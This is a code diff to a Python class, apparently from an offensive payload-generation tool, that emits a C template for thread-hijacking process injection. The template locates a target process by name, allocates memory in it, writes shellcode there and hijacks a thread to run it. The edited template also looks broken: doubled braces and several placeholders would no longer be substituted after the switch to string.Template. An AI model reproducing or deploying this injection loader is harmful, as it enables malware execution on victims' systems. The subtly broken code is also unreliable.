@@ -1,3 +1,5 @@
+from string import Template
+
 class threadhijack:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -18,8 +20,8 @@ class threadhijack:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 
 {imports}
 
@@ -27,7 +29,6 @@ class threadhijack:
         
 int main(void)
 {{
-
     
     {transformers}
     
@@ -51,7 +52,7 @@ int main(void)
 
     while (Process32Next(hProcSnap, &pe32))
     {{
-        if (lstrcmpiA("{self.target}", pe32.szExeFile) == 0)
+        if (lstrcmpiA("$target", pe32.szExeFile) == 0)
         {{
             pid = pe32.th32ProcessID;
             break;
@@ -86,7 +87,7 @@ int main(void)
     CloseHandle(Snap);
 
     // perform payload injection
-    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
+    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
     WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
 
     // execute the payload by hijacking a thread in target process
@@ -105,4 +106,4 @@ int main(void)
     CloseHandle(hProc);
     return 0;
 }}
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
